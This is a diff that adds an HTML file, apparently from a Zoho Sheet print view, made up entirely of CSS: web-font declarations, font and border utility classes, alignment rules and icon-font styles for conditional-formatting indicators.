@@ -1,0 +1,1923 @@
+<HTML><HEAD><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><style type='text/css' nonce=nonce >@font-face{font-family:"Roboto";src: url("https://static.zohocdn.com/webfonts/robotoregular/font.eot");src:url("https://static.zohocdn.com/webfonts/robotoregular/font.eot?#iefix") format("eot"), url("https://static.zohocdn.com/webfonts/robotoregular/font.woff2") format("woff2"), url("https://static.zohocdn.com/webfonts/robotoregular/font.woff") format("woff");}@font-face{font-family:"Roboto";font-weight:bold;src: url("https://static.zohocdn.com/webfonts/robotobold/font.eot");src:url("https://static.zohocdn.com/webfonts/robotobold/font.eot?#iefix") format("eot"), url("https://static.zohocdn.com/webfonts/robotobold/font.woff2") format("woff2"), url("https://static.zohocdn.com/webfonts/robotobold/font.woff") format("woff");}@font-face{font-family:"Roboto";font-style:italic;src: url("https://static.zohocdn.com/webfonts/robotoitalic/font.eot");src:url("https://static.zohocdn.com/webfonts/robotoitalic/font.eot?#iefix") format("eot"), url("https://static.zohocdn.com/webfonts/robotoitalic/font.woff2") format("woff2"), url("https://static.zohocdn.com/webfonts/robotoitalic/font.woff") format("woff");}</style><style>.cD{-moz-box-sizing: border-box;  box-sizing:border-box; padding: 2px 4px; position: absolute; border-width: 0px 1px 1px 0px; border-style:solid; border-right:1px solid #D5D5D5; border-bottom:1px solid #D5D5D5; display:flex;  display:-ms-flex; overflow:visible;background-color:#fff; color:#000;height:19px; width:80; }.brt{ border-right: 1px solid transparent; } .bbt{ border-bottom: 1px solid transparent;} </style><style type='text/css'>@font-face { font-family:'Roboto'; font-weight:400; font-style:normal; src:url('https://static.zohocdn.com/webfonts/robotoregular/font.woff') format('woff'); }@font-face { font-family:'Roboto'; font-weight:700; font-style:normal; src:url('https://static.zohocdn.com/webfonts/robotobold/font.woff') format('woff'); }@font-face { font-family:'Roboto'; font-weight:400; font-style:italic; src:url('https://static.zohocdn.com/webfonts/robotoitalic/font.woff') format('woff'); }@font-face { font-family:'Roboto'; font-weight:700; font-style:italic; src:url('https://static.zohocdn.com/webfonts/robotobolditalic/font.woff') format('woff'); }@font-face { font-family:'Lato'; font-weight:400; font-style:normal; src:url('https://static.zohocdn.com/webfonts/latoregular/font_latin.woff') format('woff'); unicode-range: U+20-7E, U+A0-FF, U+131, U+152-153, U+2C6, U+2DA, U+2DC, U+2013-2014, U+2018-201A, U+201C-201E, U+2020-2022, U+2026, U+2030, U+2039-203A, U+2044, U+20AC, U+2212;}@font-face { font-family:'Lato'; font-weight:400; font-style:normal; src:url('https://static.zohocdn.com/webfonts/latoregular/font_latin_ext.woff') format('woff'); unicode-range: U+104-107, U+118-119, U+141-144, U+15A-15B, U+160-161, U+178-17E, U+192;}@font-face { font-family:'Lato'; font-weight:400; font-style:normal; src:url('https://static.zohocdn.com/webfonts/latoregular/font_others.woff') format('woff'); unicode-range: U+2C7, U+2C9, U+2D8-2D9, U+2DB, U+2DD, U+3C0, U+2122, U+2126, U+2202, U+2206, U+220F, U+2211, U+221A, U+221E, U+222B, U+2248, U+2260, U+2264-2265, U+25CA, U+2669, U+FB01-FB02;}@font-face { font-family:'Lato'; font-weight:700; font-style:normal; src:url('https://static.zohocdn.com/webfonts/latobold/font_latin.woff') format('woff'); unicode-range: U+20-7E, U+A0-FF, U+131, U+152-153, U+2C6, U+2DA, U+2DC, U+2013-2014, U+2018-201A, U+201C-201E, U+2020-2022, U+2026, U+2030, U+2039-203A, U+2044, U+20AC, U+2212;}@font-face { font-family:'Lato'; font-weight:700; font-style:normal; src:url('https://static.zohocdn.com/webfonts/latobold/font_latin_ext.woff') format('woff'); unicode-range: U+104-107, U+118-119, U+141-144, U+15A-15B, U+160-161, U+178-17E, U+192;}@font-face { font-family:'Lato'; font-weight:700; font-style:normal; src:url('https://static.zohocdn.com/webfonts/latobold/font_others.woff') format('woff'); unicode-range: U+2C7, U+2C9, U+2D8-2D9, U+2DB, U+2DD, U+3C0, U+2122, U+2126, U+2202, U+2206, U+220F, U+2211, U+221A, U+221E, U+222B, U+2248, U+2260, U+2264-2265, U+25CA, U+2669, U+FB01-FB02;}</style>
+<style>/*$Id$*/
+body {
+	margin: 0;
+	padding: 0;
+}
+body, html {
+    height: 100%;
+    width: 100%;
+    margin: 0;
+    background: #fff;
+    font-size: 13px;
+    font-family: 'Lato', Helvetica, sans-serif,Arial;
+    color: #1d1d1d;
+    font-variant-ligatures: none;
+}
+
+.row {
+	position: absolute;
+	overflow: hidden;
+}
+
+.pvab {
+	position: absolute;
+	bottom: 0px;
+	width: 100%;
+}
+
+.printButton {
+	border-radius: 4px;
+	border: 1px solid #3A3A3A;
+	vertical-align: middle;
+	padding: 0px;
+	background-color: #F7F7F4;
+	font: 12px Arial;
+	white-space: inherit;
+}
+
+.spPrintTitle {
+	padding: 3px 5px;
+	position: absolute;
+	left: 0;
+	min-width: 32%;
+	white-space: pre-wrap;
+	z-index: 1;
+	background: var(--zsheet-white-always);
+	max-width: 100%;
+	overflow: hidden;
+	max-height: 36px;
+	min-height: 24px;
+	color: var(--zsheet-body-text-always);
+}
+
+.pageContainer {
+	position: relative;
+	display: flex;
+	flex-direction: column;
+	page-break-before: auto;
+	page-break-after: avoid;
+}
+
+.gridDiv{
+	overflow:hidden;
+}
+
+.fwb {
+
+	/* Font Weight - bold */
+	font-weight: bold !important;
+}
+
+.fsi {
+
+	/* Font Style - italic */
+	font-style: italic !important;
+}
+
+.tdu {
+
+	/* Text Decoration - underline */
+	text-decoration: underline;
+}
+
+.tdsu {
+
+	/* Text Decoration - strike through */
+	text-decoration: line-through underline;
+}
+
+.fnal {
+
+	/* Font Family - Arial */
+	font-family: Arial,'Roboto','Roboto',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnab {
+
+	/* Font Family - Arial Black */
+	font-family: Arial Black,'Archivo Black',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnbs {
+
+	/* Font Family - Basic Sans SF */
+	font-family: Basic Sans SF,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnba {
+
+	/* Font Family - Book Antiqua */
+	font-family: Book Antiqua,'Source serif pro',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnci {
+
+	/* Font Family - Calibri */
+	font-family: Calibri,'Lato',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fncs {
+
+	/* Font Family - Comic Sans MS */
+	font-family: Comic Sans MS,'Coming Soon',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fncn {
+
+	/* Font Family - Courier New */
+	font-family: Courier New,'Roboto Slab',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnes {
+
+	/* Font Family - Elementary SF */
+	font-family: Elementary SF,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fngd {
+
+	/* Font Family - Garamond */
+	font-family: Garamond,'Bubbler One',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnga {
+
+	/* Font Family - Georgia */
+	font-family: Georgia,'Droid Serif',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnlg {
+
+	/* Font Family - Letter Gothic */
+	font-family: Letter Gothic,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnlc {
+
+	/* Font Family - Lucida Console */
+	font-family: Lucida Console,'Fira Mono',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnmd {
+
+	/* Font Family - Marigold */
+	font-family: Marigold,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnms {
+
+	/* Font Family - MS Sans Serif */
+	font-family: MS Sans Serif,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnmg {
+
+	/* Font Family - MS Gothic */
+	font-family: MS Gothic,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnmpg {
+
+	/* Font Family - MS PGothic */
+	font-family: MS PGothic,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnmm {
+
+	/* Font Family - MS Mincho */
+	font-family: MS Mincho,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnmpm {
+
+	/* Font Family - MS P Mincho */
+	font-family: MS P Mincho,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnml {
+
+	/* Font Family - MingLiU */
+	font-family: MingLiU,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnsh {
+
+	/* Font Family - SimHei */
+	font-family: SimHei ,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnsm {
+
+	/* Font Family - System */
+	font-family: System ,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnta {
+
+	/* Font Family - Tahoma */
+	font-family: Tahoma,'Lato',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntn {
+
+	/* Font Family - Times New Roman */
+	font-family: Times New Roman,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntms {
+
+	/* Font Family - Trebuchet MS */
+	font-family: Trebuchet MS,'Ubuntu',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnva {
+
+	/* Font Family - Verdana */
+	font-family: Verdana,'Open sans',Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnfs {
+
+	/* Font Family - FangSong_GB2312 */
+	font-family: FangSong_GB2312,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnkt {
+
+	/* Font Family - KaiTi_GB2312 */
+	font-family: KaiTi_GB2312,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnls {
+
+	/* Font Family - LiSu */
+	font-family: LiSu,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnss {
+
+	/* Font Family - SimSun */
+	font-family: SimSun,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnnss {
+
+	/* Font Family - NSimSun */
+	font-family: NSimSun,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnyy {
+
+	/* Font Family - YouYuan */
+	font-family: YouYuan,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnssfe {
+
+	/* Font Family - Simsun (Founder Extended) */
+	font-family: Simsun (Founder Extended),Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnfzst {
+
+	/* Font Family - FZShuTi */
+	font-family: FZShuTi,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnfzy {
+
+	/* Font Family - FZYaoti */
+	font-family: FZYaoti,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstf {
+
+	/* Font Family - STFangsong */
+	font-family: STFangsong,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnsth {
+
+	/* Font Family - STHupo */
+	font-family: STHupo,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstk {
+
+	/* Font Family - STKaiti */
+	font-family: STKaiti,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstl {
+
+	/* Font Family - STLiti */
+	font-family: STLiti,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnsts {
+
+	/* Font Family - STSong */
+	font-family: STSong,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstxw {
+
+	/* Font Family - STXinwei */
+	font-family: STXinwei,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstxh {
+
+	/* Font Family - STXihei */
+	font-family: STXihei,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstxk {
+
+	/* Font Family - STXingkai */
+	font-family: STXingkai,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstz {
+
+	/* Font Family - STZhongsong */
+	font-family: STZhongsong,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnmyh {
+
+	/* Font Family - Microsoft YaHei */
+	font-family: Microsoft YaHei,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnstc {
+
+	/* Font Family - STCaiyun */
+	font-family: STCaiyun,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fni {
+
+	/* Font Family - GE Inspira */
+	font-family: GE Inspira,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnip {
+
+	/* Font Family - GE Inspira Pitch */
+	font-family: GE Inspira Pitch,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntc {
+
+	/* Font Family - Tamil Fonts - Chanakya*/
+	font-family: GIST-TMOTChanakya,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnti {
+
+	/* Font Family - Tamil Fonts - Ilango*/
+	font-family: GIST-TMOTIlango,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntptn {
+
+	/* Font Family - Tamil Fonts - Pattinathar*/
+	font-family: GIST-TMOTPattinathar,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntp {
+
+	/* Font Family - Tamil Fonts - Padma*/
+	font-family: GIST-TMOTPadma,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntk {
+
+	/* Font Family - Tamil Fonts - Krishnan*/
+	font-family: GIST-TMOTKrishnan,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fntka {
+
+	/* Font Family - Tamil Fonts - Krishnan*/
+	font-family: TSC_Kannadaasan,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fna {
+
+	/* Font Family - Tamil Fonts - Krishnan*/
+	font-family: Anjal,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnit {
+
+	/* Font Family - Impact */
+	font-family: Impact,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnam {
+
+	/* Font Family - Andale Mono */
+	font-family: Andale Mono,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnpl {
+
+	/* Font Family - Palatino Linotype */
+	font-family: Palatino Linotype,Roboto, Helvetica, sans-serif, Arial;
+}
+
+.fnsl {
+
+	/* Font Family - Symbol */
+	font-family: Symbol,Roboto, Helvetica, sans-serif, Arial;
+}
+
+.fnws {
+
+	/* Font Family - Webdings */
+	font-family: Webdings,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnws2 {
+
+	/* Font Family - Wingdings 2 */
+	font-family: Wingdings 2,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnws3 {
+
+	/* Font Family - Wingdings 3 */
+	font-family: Wingdings 3,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fncbra {
+
+	/* Font Family - Cambria */
+	font-family: Cambria,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnctry {
+
+	/* Font Family - Century */
+	font-family: Century,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.fnhmgp {
+
+	/* Font Family - HG Maru Gothic PRO */
+	font-family: HGMaruGothicMPRO,Roboto, Helvetica, sans-serif, Arial !important;
+}
+
+.f6 {
+
+	/* Font Size - 6pt */
+	font-size: 6pt !important;
+}
+
+.f8 {
+
+	/* Font Size - 8pt */
+	font-size: 8pt !important;
+}
+
+.f9 {
+
+	/* Font Size - 9pt */
+	font-size: 9pt !important;
+}
+
+.f10 {
+
+	/* Font Size - 10pt */
+	font-size: 10pt !important;
+}
+
+.f11 {
+
+	/* Font Size - 11pt */
+	font-size: 11pt !important;
+}
+
+.f12 {
+
+	/* Font Size - 12pt */
+	font-size: 12pt !important;
+}
+
+.f14 {
+
+	/* Font Size - 14pt */
+	font-size: 14pt !important;
+}
+
+.f16 {
+
+	/* Font Size - 16pt */
+	font-size: 16pt !important;
+}
+
+.f18 {
+
+	/* Font Size - 18pt */
+	font-size: 18pt !important;
+}
+
+.f20 {
+
+	/* Font Size - 20pt */
+	font-size: 20pt !important;
+}
+
+.f22 {
+
+	/* Font Size - 22pt */
+	font-size: 22pt !important;
+}
+
+.f24 {
+
+	/* Font Size - 24pt */
+	font-size: 24pt !important;
+}
+
+.f26 {
+
+	/* Font Size - 26pt */
+	font-size: 26pt !important;
+}
+
+.f28 {
+
+	/* Font Size - 28pt */
+	font-size: 28pt !important;
+}
+
+.f32 {
+
+	/* Font Size - 32pt */
+	font-size: 32pt !important;
+}
+
+.f40 {
+
+	/* Font Size - 40pt */
+	font-size: 40pt !important;
+}
+
+.f48 {
+
+	/* Font Size - 48pt */
+	font-size: 48pt !important;
+}
+
+.f56 {
+
+	/* Font Size - 56pt */
+	font-size: 56pt !important;
+}
+
+.f64 {
+
+	/* Font Size - 64pt */
+	font-size: 64pt !important;
+}
+
+.f72 {
+
+	/* Font Size - 72pt */
+	font-size: 72pt !important;
+}
+
+.fInherit{
+	font: inherit;
+}
+
+/* Only for text align center */
+.w100 {
+	width: 100%;
+	text-align: inherit;
+	pointer-events: none;
+	color: inherit !important;
+	font: inherit;
+	line-height: 1.2;
+}
+
+.bt1 {
+
+	/* Border Top - */
+	border-top: 1px solid #000 !important;
+}
+
+.bt2 {
+
+	/* Border Top - */
+	border-top: 2px solid #000 !important;
+}
+
+.btd {
+
+	/* Border Top Double - */
+	border-top: 3px double #000 !important;
+}
+
+.bb1 {
+
+	/* Border Bottom - */
+	border-bottom: 1px solid #000 !important;
+}
+
+.bb2 {
+
+	/* Border Bottom - */
+	border-bottom: 2px solid #000 !important;
+}
+
+.bbd {
+
+	/* Border Bottom - Double */
+	border-bottom: 3px double #000 !important;
+}
+
+.bl1 {
+
+	/* Border Left - */
+	border-left: 1px solid #000 !important;
+}
+
+.bl2 {
+
+	/* Border Left - */
+	border-left: 2px solid #000 !important;
+}
+
+.bld {
+
+	/* Border Left - Double */
+	border-left: 3px double #000 !important;
+}
+
+.br1 {
+
+	/* Border Right - */
+	border-right: 1px solid #000 !important;
+}
+
+.br2 {
+
+	/* Border Right - */
+	border-right: 2px solid #000 !important;
+}
+
+.brd {
+
+	/* Border Right - Double */
+	border-right: 3px double #000 !important;
+}
+
+.nW {
+
+	/* No Wrap */
+	white-space: pre;
+}
+
+.W {
+
+	/* Wrap */
+	white-space: pre-wrap;
+	word-wrap: break-word;	/*-webkit-flex:wrap;*/
+
+	/*-ms-flex-wrap:wrap;*/
+
+	/*flex-wrap: wrap;*/
+
+	/*align-content: flex-start;*/
+}
+
+.tac {
+
+	/* Text Align - Center */
+	-ms-flex-pack: center;
+	justify-content: center;
+	text-align: center;
+}
+
+.tal {
+	-ms-flex-pack: flex-start;
+	justify-content: flex-start;
+	text-align: left
+}
+
+.tar {
+
+	/* Text Align - right */
+	-ms-flex-pack: flex-end;
+	justify-content: flex-end;
+	text-align: right;
+}
+
+.fac {
+
+	/* Text Align - Center */
+	-ms-flex-pack: center;
+	justify-content: center;
+	text-align: center;
+}
+
+.far {
+
+	/* Text Align - right */
+	-ms-flex-pack: flex-end;
+	justify-content: flex-end;
+	text-align: right;
+}
+
+.fal {
+
+	/* Text Align - left */
+	-ms-flex-pack: flex-start;
+	justify-content: flex-start;
+	text-align: left;
+}
+
+.vam {
+
+	/* Vertical Align - middle */
+	display: -webkit-box;
+	-ms-flex-align: center;
+	-webkit-box-align: center;
+	align-items: center;
+	align-content: center;
+}
+
+.vat {
+
+	/* Vertical Align - top */
+	display: -webkit-box;
+	-ms-flex-align: flex-start;
+	-webkit-box-align: start;
+	align-items: flex-start;
+	align-content: flex-start;
+}
+
+.vab {
+
+	/* Vertical Align - bottom */
+	display: -webkit-box;
+	-ms-flex-align: flex-end;
+	-webkit-box-align: end;
+	align-items: flex-end;
+	align-content: flex-end;
+}
+
+.hcc {
+	color: transparent !important;
+}
+
+.PcD a {
+	color: blue;
+}
+
+.cD > a, .PcD > a {
+	display: inline-table !important;
+}
+
+.tdst {
+
+	/* Text Decoration - strike-througth */
+	text-decoration: line-through;
+}
+
+.bl3 {
+
+	/* Border Left - */
+	border-left: 3px solid #000 !important;
+}
+
+.br3 {
+
+	/* Border Right - */
+	border-right: 3px solid #000 !important;
+}
+
+.bt3 {
+
+	/* Border Top - */
+	border-top: 3px solid #000 !important;
+}
+
+.bb3 {
+
+	/* Border bottom - */
+	border-bottom: 3px solid #000 !important;
+}
+
+@font-face {
+	font-family: icons2;
+	src: url('../../handhelds/customfont/icomoon.ttf');
+}
+
+.pageContainer:before {
+	overflow: hidden;
+	content: 'a';
+	font-family: icons2;
+	position: relative;
+	color: transparent;
+	height: 0;
+	width: 0;
+}
+
+@media print 
+{
+	@page {
+		margin:0;
+	}
+}
+</style><style>/* $Id$ */
+/*
+  Icon Font: fontcustom
+*/
+
+@font-face {
+    font-family: 'Custom-fonts';
+    src:  url('Custom-fonts.eot?6of5kz');
+    src:  url('Custom-fonts.eot?6of5kz#iefix') format('embedded-opentype'),
+    url('Custom-fonts.ttf?6of5kz') format('truetype'),
+    url('Custom-fonts.woff?6of5kz') format('woff'),
+    url('Custom-fonts.svg?6of5kz#Custom-fonts') format('svg');
+    font-weight: normal;
+    font-style: normal;
+}
+
+[class^="iS-"], [class*=" iS-"] {
+  /* use !important to prevent issues with browser extensions that change fonts */
+  font-family: 'Custom-fonts' !important;
+  speak: none;
+  font-style: normal;
+  font-weight: normal;
+  font-variant: normal;
+  text-transform: none;
+  line-height: 1.2;
+  word-wrap: initial;
+  /* Better Font Rendering =========== */
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  display: inline-block;
+}
+[class^="iS-"] span, [class*=" iS-"] span{
+     font-family: 'Custom-fonts' !important;
+}
+/* ICONS STARTED*/
+.iS-5Arrows4, .iS-5Arrows3, .iS-5Arrows2, .iS-5Arrows1, .iS-5Arrows5, .iS-3Triangles0 {
+    /*display: inherit;*/
+}
+.cell .wid100{
+    position: relative;
+}
+
+/*green*/
+.iS-5Arrows4:before, .iS-5ArrowsGray4:before {
+    content: "\e955";
+    color: #408061;
+}
+.iS-5Arrows4:after, .iS-5ArrowsGray4:after {
+    content: "\e956";
+    margin-left: -1.0361328125em;
+    color: #5ab187;
+}
+/*yellow 1*/
+.tar.vam .gIS .hasCnt.iS-5Arrows3,.tar.vam .gIS .hasCnt.iS-5ArrowsGray3,.tac.vam  .gIS .hasCnt.iS-5Arrows3,.tac.vam  .gIS .hasCnt.iS-5ArrowsGray3{
+     -webkit-transform: translateY(0%) rotate(45deg);
+    transform: translateY(0%) rotate(45deg);
+}
+.iS-5Arrows3, .iS-5ArrowsGray3 {
+    -webkit-transform: rotate(45deg);
+    transform: rotate(45deg);
+}
+.iS-5Arrows3:before, .iS-5ArrowsGray3:before {
+    content: "\e955";
+    color: #b09240;
+}
+.iS-5Arrows3:after, .iS-5ArrowsGray3:after {
+    content: "\e956";
+    margin-left: -1.0361328125em;
+    color: #fcd058;
+}
+/*yellow 2*/
+.tar.vam .gIS .hasCnt.iS-5Arrows2,.tar.vam .gIS .hasCnt.iS-5ArrowsGray2,.tac.vam  .gIS .hasCnt.iS-5Arrows2,.tac.vam  .gIS .hasCnt.iS-5ArrowsGray2{
+    -webkit-transform: translateY(0%) rotate(90deg);
+    transform: translateY(0%) rotate(90deg);
+}
+.iS-5Arrows2, .iS-5ArrowsGray2 {
+    -webkit-transform: rotate(90deg);
+    transform: rotate(90deg);
+}
+.iS-5Arrows2:before, .iS-5ArrowsGray2:before {
+    content: "\e955";
+    color: #b09240;
+}
+.iS-5Arrows2:after, .iS-5ArrowsGray2:after {
+    content: "\e956";
+    margin-left: -1.0361328125em;
+    color: #fcd058;
+}
+/*yellow 3*/
+.tar.vam .gIS .hasCnt.iS-5Arrows1,.tar.vam .gIS .hasCnt.iS-5ArrowsGray1,.tac.vam .gIS .hasCnt.iS-5Arrows1,.tac.vam .gIS .hasCnt.iS-5ArrowsGray1 {
+    -webkit-transform: translateY(0) rotate(135deg);
+    transform: translateY(0) rotate(135deg);
+}
+.iS-5Arrows1, .iS-5ArrowsGray1 {
+    -webkit-transform: rotate(135deg);
+    transform: rotate(135deg);
+}
+.iS-5Arrows1:before, .iS-5ArrowsGray1:before {
+    content: "\e955";
+    color: #b09240;
+}
+.iS-5Arrows1:after, .iS-5ArrowsGray1:after {
+    content: "\e956";
+    margin-left: -1.0361328125em;
+    color: #fcd058;
+}
+/*red*/
+.tar.vam .hasCnt,.tac.vam .hasCnt{
+    position: absolute;
+    left: 0
+}
+.tar.vam .gIS .hasCnt.iS-5Arrows0, .tar.vam .gIS .hasCnt.iS-3Triangles0, .tar.vam .gIS .hasCnt.iS-5ArrowsGray0,.tac.vam .gIS .hasCnt.iS-5Arrows0, .tac.vam .gIS .hasCnt.iS-3Triangles0, .tac.vam .gIS .hasCnt.iS-5ArrowsGray0 {
+    -webkit-transform: translateY(0%) rotate(180deg);
+    transform: translateY(0%) rotate(180deg);
+}
+.iS-5Arrows0, .iS-3Triangles0, .iS-5ArrowsGray0 {
+    -webkit-transform: rotate(180deg);
+    transform: rotate(180deg);
+}
+.iS-5Arrows0:before, .iS-5ArrowsGray0:before {
+    content: "\e955";
+}
+.iS-5Arrows0:before {
+    color: #9b514a;
+}
+.iS-5Arrows0:after, .iS-5ArrowsGray0:after {
+    content: "\e956";
+    margin-left: -1.0361328125em;
+    color: #cf6a61;
+}
+
+.iS-5ArrowsGray0:before, .iS-5ArrowsGray1:before, .iS-5ArrowsGray2:before, .iS-5ArrowsGray3:before, .iS-5ArrowsGray4:before {
+    /*color: #989898;*/
+    color: #7c7c7c;
+}
+
+.iS-5ArrowsGray0:after, .iS-5ArrowsGray1:after, .iS-5ArrowsGray2:after, .iS-5ArrowsGray3:after, .iS-5ArrowsGray4:after {
+    /*color: #c0c0c0;*/
+    color: #848484;
+}
+
+/*circle*/
+.iS-5TrafficLights4:before {
+    content: "\e959";
+    color: #408061;
+}
+.iS-5TrafficLights4:after {
+    content: "\e95a";
+    margin-left: -1.0361328125em;
+    color: #5ab187;
+}
+.iS-5TrafficLights3:before {
+    content: "\e959";
+    /*color: #635328;*/
+    color: #b09240;
+}
+.iS-5TrafficLights3:after {
+    content: "\e95a";
+    margin-left: -1.0361328125em;
+    color: #fcd058;
+}
+.iS-5TrafficLights2:before, .iS-4RedToBlack3:before, .iS-4RedToBlack2:before {
+    content: "\e959";
+    /*color: #562f2b;*/
+    color: #9b514a;
+}
+.iS-5TrafficLights2:after, .iS-4RedToBlack3:after, .iS-4RedToBlack2:after {
+    content: "\e95a";
+    margin-left: -1.0361328125em;
+    color: #e07369;
+}
+.iS-4RedToBlack2:before {
+    color: #e99b9d;
+
+}
+.iS-4RedToBlack2:after {
+    color: #eea0a2;
+}
+.iS-5TrafficLights1:before, .iS-4RedToBlack1:before {
+    content: "\e959";
+    /*color: #989898;*/
+    color: #7c7c7c; 
+}
+.iS-5TrafficLights1:after, .iS-4RedToBlack1:after {
+    content: "\e95a";
+    margin-left: -1.0361328125em;
+    /*color: #c0c0c0;*/
+    color: #848484;
+}
+.iS-5TrafficLights0:before, .iS-4RedToBlack0:before {
+    content: "\e959";
+    color: #562f2b;
+}
+.iS-5TrafficLights0:after, .iS-4RedToBlack0:after {
+    content: "\e95a";
+    margin-left: -1.0361328125em;
+    color: #000;
+}
+
+.iS-3TrafficLights20:before, .iS-3TrafficLights21:before, .iS-3TrafficLights22:before {
+    content: "\e909";
+    color: #000;
+}
+.iS-3TrafficLights20:after, .iS-3TrafficLights21:after, .iS-3TrafficLights22:after {
+    content: "\e90a";
+    margin-left: -1em;
+    color: #264f3b;
+}
+.iS-3TrafficLights20 span:before, .iS-3TrafficLights21 span:before, .iS-3TrafficLights22 span:before {
+    content: "\e90b";
+    margin-left: -1em;
+    color: #e07369;
+}
+.iS-3TrafficLights21 span:before {
+    color: #fcd058;
+}
+.iS-3TrafficLights22 span:before {
+    color: #5ab187; 
+}
+/*triangle*/
+.iS-3Signs1:before {
+    content: "\e970";
+    color: #fcd058;
+}
+.iS-3Signs1:after {
+    content: "\e971";
+    margin-left: -1.0712890625em;
+    color: #b09240;
+}
+/*diamond*/
+.iS-3Signs0:before {
+    content: "\e968";
+    color: #e07369;
+}
+.iS-3Signs0:after {
+    content: "\e969";
+    margin-left: -1em;
+    color: #9b514a;
+}
+/*triangle green*/
+.iS-3Triangles2:before {
+    content: "\e953";
+    color: #5ab187;
+}
+.iS-3Triangles2:after {
+    content: "\e954";
+    margin-left: -1.0361328125em;
+    color: #408061;
+}
+/*triangle yellow*/
+.iS-3Triangles1:before {
+    content: "\e951";
+    color: #fcd058;
+}
+.iS-3Triangles1:after {
+    content: "\e952";
+    margin-left: -1.0361328125em;
+    color: #b09240;
+}
+/*triangle red*/
+.iS-3Triangles0:before {
+    content: "\e953";
+    color: #e07369;
+}
+.iS-3Triangles0:after {
+    content: "\e954";
+    margin-left: -1.0361328125em;
+    color: #9b514a;
+}
+/*heart green */
+.iS-3Heart2:before {
+    content: "\e90f";
+    color: #52a37c;
+}
+.iS-3Heart2:after {
+    content: "\e920";
+    margin-left: -1.12890625em;
+    color: #5ab187;
+}
+/*heart yellow */
+.iS-3Heart1:before {
+    content: "\e90f";
+    color: #e8bf50;
+}
+.iS-3Heart1:after {
+    content: "\e920";
+    margin-left: -1.12890625em;
+    color: #fcd058;
+}
+/*heart red */
+.iS-3Heart0:before {
+    content: "\e93b";
+    color: #e07369;
+}
+.iS-3Heart0:after {
+    content: "\e93c";
+    margin-left: -1.12890625em;
+    color: #9b514a;
+}
+/* tick */
+.iS-2Indicators1:before {
+    content: "\e972";
+    color: #408061;
+}
+.iS-2Indicators1:after {
+    content: "\e973";
+    margin-left: -1.173828125em;
+    color: #5ab187;
+}
+.iS-2Indicators2:before {
+    content: "\e965";
+    color: #408061;
+}
+.iS-2Indicators2:after {
+    content: "\e966";
+    margin-left: -1.181640625em;
+    color: #5ab187;
+}
+/* not */
+/*.iS-3Indicators1:before {
+    content: "\e90b";
+    color: #635328;
+}
+.iS-3Indicators1:after {
+    content: "\e906";
+    margin-left: -0.181640625em;
+    color: #fcd058;
+}*/
+/* cross */
+.iS-2Indicators0:before {
+    content: "\e957";
+    color: #9b514a;
+}
+.iS-2Indicators0:after {
+    content: "\e958";
+    margin-left: -1em;
+    color: #e07369;
+}
+
